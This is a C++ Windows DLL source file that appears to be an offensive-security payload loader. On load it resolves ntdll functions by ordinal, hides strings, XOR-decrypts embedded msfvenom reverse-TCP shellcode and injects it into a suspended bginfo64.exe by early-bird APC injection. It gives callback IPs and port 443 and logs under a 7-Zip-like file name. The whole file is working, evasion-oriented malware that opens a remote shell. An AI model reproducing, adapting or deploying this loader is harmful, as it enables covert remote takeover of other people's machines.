// dllmain.cpp : Defines the entry point for the DLL application.
#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <winternl.h>

#include "mapping.h"

/* From ChatGPT:
#include <Windows.h>
#include <stdio.h>

int main() {
	// Load ntdll.dll
	HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
	if (hNtdll == NULL) {
		printf("Failed to load ntdll.dll\n");
		return 1;
	}

	// Ordinal number of the function you want to call (e.g., NtQuerySystemInformation)
	DWORD ordinalNumber = 0x0; // Replace with the actual ordinal number

	// Get a function pointer by ordinal number
	FARPROC pFunction = GetProcAddress(hNtdll, MAKEINTRESOURCEA(ordinalNumber));
	if (pFunction == NULL) {
		printf("Failed to get function by ordinal number\n");
		return 2;
	}

	// Define a function pointer with the correct signature
	typedef NTSTATUS(WINAPI* NtQuerySystemInformationFunc)(
		ULONG SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
	);

	// Cast the generic pointer to the function pointer type
	NtQuerySystemInformationFunc pNtQuerySystemInformation = (NtQuerySystemInformationFunc)pFunction;

	// Now you can call the function
	ULONG returnLength;
	NTSTATUS status = pNtQuerySystemInformation(0, NULL, 0, &returnLength);

	// Check the status and process the result as needed
	if (status == 0) {
		printf("NtQuerySystemInformation succeeded\n");
	} else {
		printf("NtQuerySystemInformation failed with status 0x%X\n", status);
	}

	// Free the library when you're done
	FreeLibrary(hNtdll);

	return 0;
}

Ordinals for:

Host Name:                 HATHOR
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348

NtAllocateVirtualMemory		0xe2
NtProtectVirtualMemory		0x1d5
NtWriteVirtualMemory		0x2a5
NtQueueApcThread			0x212
NtResumeThread				0x237

*/

#define DEBUGGING 0

#define MAXSHELLCODESIZE 4096
#define _CRT_SECURE_NO_DEPRECATE

#pragma warning (disable : 4996)

using namespace std;
unsigned char   buf[MAXSHELLCODESIZE];
unsigned long temp;

#if DEBUGGING == 1
FILE* flog = NULL;
#endif

void rox(unsigned char* key, int keysize, unsigned char* buf, int bufsize)
{
	unsigned char* k = key, * d = buf;
	int i = 0, l = 0;

#if DEBUGGING == 1
	if (flog) {
		fprintf(flog, "Entering rox, key size is %d, buffer size is %d\n", keysize, bufsize);
		fflush(flog);
	}
#endif

	while (i++ < bufsize) {
		*d++ ^= *k++;
		if (!(i % keysize)) {
#if DEBUGGING == 1
			if (flog) {
				fprintf(flog, "rox, key wrap around\n");
				fflush(flog);
			}
#endif
			k = key;
		}
	}
#if DEBUGGING == 1
	if (flog) {
		fprintf(flog, "Exiting rox, %d bytes decrypted\n", i);
		fflush(flog);
	}
#endif
}

// Function mappings
NtAllocateVirtualMemoryFunc pNtAllocateVirtualMemory = NULL;
NtProtectVirtualMemoryFunc	pNtProtectVirtualMemory	= NULL;
NtWriteVirtualMemoryFunc	pNtWriteVirtualMemory = NULL;
NtQueueApcThreadFunc		pNtQueueApcThread = NULL;
NtResumeThreadFunc			pNtResumeThread = NULL;

BOOL mapp()
{
	HMODULE		hNtdll;
	FARPROC		pFunction;
	DWORD		ordinalNumber;
	char		libraryname[10];

	libraryname[0] = 'n';
	libraryname[1] = 't';
	libraryname[2] = 'd';
	libraryname[3] = 'l';
	libraryname[4] = libraryname[3];
	libraryname[5] = '.';
	libraryname[6] = libraryname[2];
	libraryname[7] = libraryname[4];
	libraryname[8] = libraryname[3];
	libraryname[9] = '\0';

#if DEBUGGING == 1
	if (flog) {
		fprintf(flog, "Mapping functions from dll %s\n", libraryname);
		fflush(flog);
	}
#endif

	if ((hNtdll = LoadLibraryA(libraryname)) == NULL) {
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "Failed to load dll\n");
			fflush(flog);
		}
#endif
		return 0;
	}

	// Map NtAllocateVirtualMemory
	ordinalNumber = ORD_NtAllocateVirtualMemory;
	if( (pFunction = GetProcAddress(hNtdll, MAKEINTRESOURCEA(ordinalNumber))) == NULL) {;
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "Failed to map Allocate Memory function\n");
			fflush(flog);
		}
#endif
		return FALSE;
	}
	pNtAllocateVirtualMemory = (NtAllocateVirtualMemoryFunc)pFunction;

	// Map NtProtectVirtualMemoryFunc
	ordinalNumber = ORD_NtProtectVirtualMemory;
	if ((pFunction = GetProcAddress(hNtdll, MAKEINTRESOURCEA(ordinalNumber))) == NULL) {
		;
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "Failed to map Protect Memory function\n");
			fflush(flog);
		}
#endif
		return FALSE;
	}
	pNtProtectVirtualMemory = (NtProtectVirtualMemoryFunc)pFunction;

	// Map NtWriteVirtualMemoryFunc
	ordinalNumber = ORD_NtWriteVirtualMemory;
	if ((pFunction = GetProcAddress(hNtdll, MAKEINTRESOURCEA(ordinalNumber))) == NULL) {
		;
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "Failed to map Write Memory function\n");
			fflush(flog);
		}
#endif
		return FALSE;
	}
	pNtWriteVirtualMemory = (NtWriteVirtualMemoryFunc)pFunction;

	// Map NtQueueApcThread
	ordinalNumber = ORD_NtQueueApcThread;
	if ((pFunction = GetProcAddress(hNtdll, MAKEINTRESOURCEA(ordinalNumber))) == NULL) {
		;
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "Failed to map Queue APC function\n");
			fflush(flog);
		}
#endif
		return FALSE;
	}
	pNtQueueApcThread = (NtQueueApcThreadFunc)pFunction;

	// Map NtResumeThread
	ordinalNumber = ORD_NtResumeThread;
	if ((pFunction = GetProcAddress(hNtdll, MAKEINTRESOURCEA(ordinalNumber))) == NULL) {
		;
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "Failed to map Resume Thread function\n");
			fflush(flog);
		}
#endif
		return FALSE;
	}
	pNtResumeThread = (NtResumeThreadFunc)pFunction;
#if DEBUGGING == 1
	if (flog) {
		fprintf(flog, "Mapping done\n");
		fflush(flog);
	}
#endif

	return TRUE;
}

int inject()
{
	char _key[] = "advapi32.dll";
#if DEBUGGING == 1
	int i;
#endif

	NTSTATUS        ntstatus;
	LPVOID          start_address = NULL;
	SIZE_T          code_size;
	DWORD           oldProtect = NULL;
	unsigned char* buffer;
	// shellcode: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -o raw -f rev.bin
	// then use cyberchef to xor and hex encode
	// shellcode for real PBB (IP = 192.168.251.3
	unsigned char	shellcode[] = { 0x9d,0x2c,0xf5,0x85,0x80,0x81,0xf3,0x32,0x2e,0x64,0x2d,0x3d,0x20,0x34,0x24,0x30,0x26,0x21,0x02,0xe0,0x4b,0x2c,0xe7,0x3e,0x01,0x2c,0xfd,0x33,0x68,0x21,0xb8,0x60,0x0e,0x2c,0xe7,0x1e,0x31,0x2c,0x79,0xd6,0x3a,0x23,0x7e,0x03,0xe7,0x2c,0x5d,0xac,0xcd,0x58,0x17,0x1d,0x72,0x45,0x13,0x73,0xef,0xad,0x61,0x2d,0x60,0xa5,0x94,0x8c,0x22,0x28,0x62,0x7a,0xa5,0x36,0x4c,0xe7,0x23,0x58,0x3e,0x60,0xa0,0xe2,0xb3,0xba,0x2e,0x64,0x6c,0x24,0xe4,0xa4,0x02,0x06,0x38,0x68,0xe3,0x62,0xa5,0x2c,0x74,0x28,0xea,0x24,0x56,0x28,0x71,0xb9,0xd0,0x64,0x66,0x9b,0xa5,0x2d,0xea,0x50,0xfe,0x29,0x71,0xbf,0x7e,0x03,0xe7,0x2c,0x5d,0xac,0xcd,0x25,0xb7,0xa8,0x7d,0x28,0x32,0xf3,0x16,0x84,0x19,0x9d,0x2d,0x67,0x3a,0x45,0x78,0x2c,0x0a,0xe3,0x5b,0xbc,0x34,0x28,0xea,0x24,0x52,0x28,0x71,0xb9,0x55,0x73,0xa5,0x68,0x24,0x28,0xea,0x24,0x6a,0x28,0x71,0xb9,0x72,0xb9,0x2a,0xec,0x24,0x6d,0xb1,0x25,0x2e,0x20,0x28,0x37,0x6a,0x68,0x6f,0x3c,0x2d,0x35,0x20,0x3e,0x3e,0xe2,0x9c,0x49,0x72,0x60,0xd1,0x84,0x34,0x2d,0x38,0x3e,0x3e,0xea,0x62,0x80,0x64,0xcd,0xd1,0x9b,0x31,0x25,0xdf,0x13,0x05,0x53,0x2f,0x5a,0x01,0x32,0x2e,0x25,0x3a,0x25,0xe8,0x82,0x3e,0xe0,0x9c,0xc9,0x32,0x32,0x2e,0x2d,0xe5,0x89,0x28,0xd8,0x74,0x61,0x71,0xd2,0xf3,0x9a,0xd5,0x67,0x2d,0x38,0x28,0xed,0x92,0x2d,0xf9,0x98,0x72,0x88,0x62,0x13,0x4a,0x6b,0x9e,0xb1,0x3a,0xe8,0x9a,0x01,0x32,0x33,0x2e,0x64,0x35,0x2d,0xdb,0x4d,0xf6,0x0a,0x70,0x96,0xe6,0x62,0x7e,0x29,0x5d,0xa5,0x2c,0x55,0xb6,0x29,0x8f,0xa9,0x7b,0xbb,0xec,0x2c,0x93,0xac,0x29,0xed,0xb7,0x20,0xca,0x83,0x3c,0xed,0xce,0x9b,0xb9,0x24,0xe8,0xa3,0x1c,0x71,0x31,0x31,0x7f,0xbb,0xcc,0x2c,0xe5,0x95,0x20,0xde,0xef,0xc4,0x04,0x08,0xcc,0xe7,0x66,0xe5,0xa8,0x2c,0x63,0x64,0x76,0x28,0xc8,0x0a,0x5e,0x56,0x2e,0x64,0x6c,0x6c,0x61,0x25,0x26,0x20,0x20,0x21,0xba,0xd0,0x79,0x33,0x3b,0x21,0x50,0xa4,0x1c,0x6c,0x29,0x28,0x63,0xd0,0xd2,0x02,0xab,0x28,0x45,0x30,0x77,0x60,0x38,0xe4,0x77,0x16,0x36,0xa2,0x6c,0x04,0x29,0xed,0x90,0x37,0x20,0x28,0x63,0x73,0x7e,0x25,0x3c,0x25,0x9e,0xa4,0x37,0x31,0x39,0x96,0xfb,0x7f,0xa7,0xa5,0x20,0xe5,0xa0,0x25,0xcc,0x18,0xbc,0x56,0xb5,0xcd,0xfb,0x2c,0x5d,0xbe,0x29,0x9b,0xbc,0xea,0x7e,0x28,0x89,0x3a,0xa9,0x79,0x0c,0x93,0xb4,0xdf,0x96,0x7c,0x5a,0x63,0x72,0x88,0x88,0xf1,0xd1,0xf1,0x9e,0xb1,0x3e,0xe2,0xb4,0x41,0x0f,0x34,0x52,0x6e,0xec,0x97,0x81,0x11,0x73,0xda,0x37,0x7a,0x41,0x5d,0x44,0x64,0x35,0x2d,0xe8,0xbe,0x89,0xb4 };
	// shellcode for lab (IP = 192.168.1.4
//	unsigned char   shellcode[] = { 0x9d,0x2c,0xf5,0x85,0x80,0x81,0xf3,0x32,0x2e,0x64,0x2d,0x3d,0x20,0x34,0x24,0x30,0x26,0x21,0x02,0xe0,0x4b,0x2c,0xe7,0x3e,0x01,0x2c,0xfd,0x33,0x68,0x21,0xb8,0x60,0x0e,0x2c,0xe7,0x1e,0x31,0x2c,0x79,0xd6,0x3a,0x23,0x7e,0x03,0xe7,0x2c,0x5d,0xac,0xcd,0x58,0x17,0x1d,0x72,0x45,0x13,0x73,0xef,0xad,0x61,0x2d,0x60,0xa5,0x94,0x8c,0x22,0x28,0x62,0x7a,0xa5,0x36,0x4c,0xe7,0x23,0x58,0x3e,0x60,0xa0,0xe2,0xb3,0xba,0x2e,0x64,0x6c,0x24,0xe4,0xa4,0x02,0x06,0x38,0x68,0xe3,0x62,0xa5,0x2c,0x74,0x28,0xea,0x24,0x56,0x28,0x71,0xb9,0xd0,0x64,0x66,0x9b,0xa5,0x2d,0xea,0x50,0xfe,0x29,0x71,0xbf,0x7e,0x03,0xe7,0x2c,0x5d,0xac,0xcd,0x25,0xb7,0xa8,0x7d,0x28,0x32,0xf3,0x16,0x84,0x19,0x9d,0x2d,0x67,0x3a,0x45,0x78,0x2c,0x0a,0xe3,0x5b,0xbc,0x34,0x28,0xea,0x24,0x52,0x28,0x71,0xb9,0x55,0x73,0xa5,0x68,0x24,0x28,0xea,0x24,0x6a,0x28,0x71,0xb9,0x72,0xb9,0x2a,0xec,0x24,0x6d,0xb1,0x25,0x2e,0x20,0x28,0x37,0x6a,0x68,0x6f,0x3c,0x2d,0x35,0x20,0x3e,0x3e,0xe2,0x9c,0x49,0x72,0x60,0xd1,0x84,0x34,0x2d,0x38,0x3e,0x3e,0xea,0x62,0x80,0x64,0xcd,0xd1,0x9b,0x31,0x25,0xdf,0x13,0x05,0x53,0x2f,0x5a,0x01,0x32,0x2e,0x25,0x3a,0x25,0xe8,0x82,0x3e,0xe0,0x9c,0xc9,0x32,0x32,0x2e,0x2d,0xe5,0x89,0x28,0xd8,0x74,0x61,0x71,0xd2,0xf3,0x9a,0x2f,0x60,0x2d,0x38,0x28,0xed,0x92,0x2d,0xf9,0x98,0x72,0x88,0x62,0x13,0x4a,0x6b,0x9e,0xb1,0x3a,0xe8,0x9a,0x01,0x32,0x33,0x2e,0x64,0x35,0x2d,0xdb,0x4d,0xf6,0x0a,0x70,0x96,0xe6,0x62,0x7e,0x29,0x5d,0xa5,0x2c,0x55,0xb6,0x29,0x8f,0xa9,0x7b,0xbb,0xec,0x2c,0x93,0xac,0x29,0xed,0xb7,0x20,0xca,0x83,0x3c,0xed,0xce,0x9b,0xb9,0x24,0xe8,0xa3,0x1c,0x71,0x31,0x31,0x7f,0xbb,0xcc,0x2c,0xe5,0x95,0x20,0xde,0xef,0xc4,0x04,0x08,0xcc,0xe7,0x66,0xe5,0xa8,0x2c,0x63,0x64,0x76,0x28,0xc8,0x0a,0x5e,0x56,0x2e,0x64,0x6c,0x6c,0x61,0x25,0x26,0x20,0x20,0x21,0xba,0xd0,0x79,0x33,0x3b,0x21,0x50,0xa4,0x1c,0x6c,0x29,0x28,0x63,0xd0,0xd2,0x02,0xab,0x28,0x45,0x30,0x77,0x60,0x38,0xe4,0x77,0x16,0x36,0xa2,0x6c,0x04,0x29,0xed,0x90,0x37,0x20,0x28,0x63,0x73,0x7e,0x25,0x3c,0x25,0x9e,0xa4,0x37,0x31,0x39,0x96,0xfb,0x7f,0xa7,0xa5,0x20,0xe5,0xa0,0x25,0xcc,0x18,0xbc,0x56,0xb5,0xcd,0xfb,0x2c,0x5d,0xbe,0x29,0x9b,0xbc,0xea,0x7e,0x28,0x89,0x3a,0xa9,0x79,0x0c,0x93,0xb4,0xdf,0x96,0x7c,0x5a,0x63,0x72,0x88,0x88,0xf1,0xd1,0xf1,0x9e,0xb1,0x3e,0xe2,0xb4,0x41,0x0f,0x34,0x52,0x6e,0xec,0x97,0x81,0x11,0x73,0xda,0x37,0x7a,0x41,0x5d,0x44,0x64,0x35,0x2d,0xe8,0xbe,0x89,0xb4 };
	// raw shellcode for lab (IP = 192.168.1.4, no XOR
//	unsigned char	shellcode[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,0xc0,0xa8,0x01,0x04,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };
	unsigned long	shellcode_size;

	shellcode_size = sizeof(shellcode);

#if DEBUGGING == 1
	if (flog) {
		fprintf(flog, "Entering inject, shellcode size is %d\n", shellcode_size);
		fflush(flog);
	}
#endif

	if (shellcode_size == 0) {
		return 0; // shellcode size is 0
	}
	if (shellcode_size > MAXSHELLCODESIZE) {
		return 0; // shellcode too big
	}

	// map the function by ordinal
	if (!mapp()) {
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "Mapping functions failed\n");
			fflush(flog);
		}
#endif
		exit(0);
	}

	// create startup info struct
	LPSTARTUPINFOA startup_info = new STARTUPINFOA();
	startup_info->cb = sizeof(STARTUPINFOW);
	startup_info->dwFlags = STARTF_USESHOWWINDOW;

	// create process info struct
	PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

	// null terminated command line
	char cmd[] = "c:\\share\\bginfo64.exe";
	//char cmd[] = "notepad.exe";

	// create process
	if (!CreateProcessA(
		NULL,
		cmd,
		NULL,
		NULL,
		FALSE,
		CREATE_NO_WINDOW | CREATE_SUSPENDED,
		NULL,
		NULL,
		startup_info,
		process_info)) {
		// fprintf(stderr, "Error %lx creating process\n", GetLastError());
		exit(0);
	}

#if DEBUGGING == 1
	if (flog) {
		fprintf(flog, "Started a suspended %s, pid %d, check with processhacker or taskmanager\n", cmd, GetProcessId(process_info->hProcess));
		fflush(flog);
	}
#endif

	// Allocate Virtual Memory
	code_size = (SIZE_T)sizeof(shellcode);
	//fprintf(stderr, "1.Shellcode size is %d, code_size is %d\n", shellcode_size, code_size);
	ntstatus = pNtAllocateVirtualMemory(process_info->hProcess, &start_address, 0, &code_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//fprintf(stderr, "1a.Shellcode size is %d, code_size is %d\n", shellcode_size, code_size);
	if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "NtAllocVirtualMemory error, ntstatus is %d\n", ntstatus);
			fflush(flog);
		}
#endif
		return 0;
	}
	else {
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "Virtual Memory allocated at %llx, allocated size %d\n", (unsigned __int64)start_address, (unsigned int)code_size);
			fflush(flog);
		}
#endif
	}

	buffer = (unsigned char *)VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
#if DEBUGGING == 1
	if (flog) {
		fprintf(flog, "VirtualAlloc at %llx\n", (unsigned __int64)buffer);
		fflush(flog);
	}
#endif
	// Copy the character array to the allocated memory using memcpy.
	std::memcpy(buffer, shellcode, sizeof(shellcode));

#if DEBUGGING == 1
	if (flog) {
		fprintf(flog, "encrypted data:\n");
		for (i = 0; i < sizeof(shellcode); i++) {
			fprintf(flog, "0x%02x ", ((unsigned char*)buffer)[i]);
		}
		fprintf(flog, "\n");
		fflush(flog);
	}
#endif
	rox((unsigned char *)_key, (int)strlen(_key), buffer, sizeof(shellcode));

#if DEBUGGING == 1
	if (flog) {
		fprintf(flog, "decrypted data:\n");
		for (i = 0; i < sizeof(shellcode); i++) {
			fprintf(flog, "0x%02x ", ((unsigned char*)buffer)[i]);
		}
		fprintf(flog, "\n");
		fflush(flog);
	}
#endif

#if DEBUGGING == 1
	if (flog) {
		fprintf(flog, "4. Decrypted shellcode size is %d\n", shellcode_size);
		fflush(flog);
	}
#endif

	// Copy encrypted shellcode into allocated memory
	ntstatus = pNtWriteVirtualMemory(process_info->hProcess, start_address, (PVOID)buffer, sizeof(shellcode), 0);
	if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "NtWriteVirtualMemory error, ntstatus is %x\n", (unsigned int)ntstatus);
			fflush(flog);
		}
#endif
		return 0;
	}
	else {
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "Memory written with decrypted shellcode\n");
			fflush(flog);
		}
#endif
	}

	ntstatus = pNtProtectVirtualMemory(process_info->hProcess, &start_address, (PSIZE_T)&code_size, PAGE_EXECUTE_READ, &oldProtect);
	if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "NtProtectVirtualMemory error, ntstatus is %lx\n", ntstatus);
			fflush(flog);
		}
#endif
		return 0;
	}
	else {
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "Memory Protected\n");
			fflush(flog);
		}
#endif
	}

	ntstatus = pNtQueueApcThread(process_info->hThread, PKNORMAL_ROUTINE(start_address), start_address, NULL, NULL);
	if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "NtQueueApcThread error, ntstatus is %d\n", ntstatus);
			fflush(flog);
		}
#endif
		return 0;
	}
	else {
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "APC thread queued\n");
			fflush(flog);
		}
#endif
	}

	ntstatus = pNtResumeThread(process_info->hThread, NULL);
	if (!NT_SUCCESS(ntstatus)) {
#if DEBUGGING == 1
		if (flog) {
			fprintf(flog, "NtResumeThread error, ntstatus is %d\n", ntstatus);
			fflush(flog);
		}
#endif
		return 0;
	}
#if DEBUGGING == 1
	else {
		if (flog) {
			fprintf(flog, "Thread resumed\n");
			fflush(flog);
		}
	}
#endif

	// close handles
	CloseHandle(process_info->hThread);
	CloseHandle(process_info->hProcess);
#if DEBUGGING == 1
	if (flog) {
		fprintf(flog, "All done, bye!\n");
		fflush(flog);
	}
#endif
	return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
#if DEBUGGING==1
	flog = fopen("c:\\windows\\tasks\\7-zip64.log", "w");
	if (flog) {
		fprintf(flog, "Entered DLLMAIN, readon for call %d\n", ul_reason_for_call);
		fflush(flog);
	}
#endif
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		fprintf(stderr, "Entering DLL_PROCESS_ATTACH\n");
		inject();
	case DLL_THREAD_ATTACH:
		fprintf(stderr, "Entering DLL_PROCESS_ATTACH\n");
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
#if DEBUGGING==1
	if (flog) {
		fprintf(flog, "Exit DLLMAIN\n");
		fclose(flog);
	}
#endif
	return TRUE;
}